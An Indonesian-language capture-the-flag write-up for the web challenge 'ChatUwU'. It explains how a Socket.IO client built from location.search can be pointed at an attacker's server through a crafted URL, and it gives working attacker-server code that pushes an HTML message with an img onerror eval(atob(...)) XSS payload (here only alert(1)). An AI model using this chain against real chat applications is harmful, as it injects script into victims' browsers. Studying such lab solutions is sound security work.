# web
---
## ChatUwU
Kita diberikan attachment yang berupa aplikasi yang menggunakan nodejs dengan dependency express dan juga socket io.

Langsung masuk ke intinya.
Vulnerability pada web app tersebut berada di client side pada kode berikut
`index.html`
```js
        document.title += ' - ' + room;
        let socket = io(`/${location.search}`), # <- vulnerable code
            messages = document.getElementById('messages'),
            form = document.getElementById('form'),
            input = document.getElementById('input');
```

socket io mengambil parameter location.search sebagai inputnya. Kita bisa memanipulasi location.search dengan menambahkan foo@attacker.com di salah satu parameter url misalnya
http://localhost:58000/?nickname=x@localhost:8000/?nickname=x&room=DOMPurify

Dengan cara ini kita dapat mengubah poin akses socket io ke web socket yang kita buat sendiri sehingga kita dapat mengirimkan malcious data yang berisi payload untuk mendapatkan xss di client. 

Berikut code yang saya gunakan untuk membuat attacker server:

```js
const http = require("http").Server();
const { Server } = require("socket.io");

const io = new Server(http, {
  cors: {
    origin: "http://localhost:58000",
  },
});

const hostname = "0.0.0.0";
const port = 8000;

let payload = btoa(`
// xss payload here
alert(1)
`)
payload = `
<img src='x' onerror=eval(atob("${payload}"))>
`;

io.on("connection", (socket) => {
  let { room } = socket.handshake.query;
  console.log(socket.handshake.query);

  socket.join(room);
  io.to(room).emit("msg", {
    from: "attacker",
    text: payload,
    isHtml: true,
  });
});

http.listen(port, hostname, () => {
  console.log(`ChatUWU server running at http://${hostname}:${port}/`);
});
```

![](Pasted%20image%2020230109172555.png)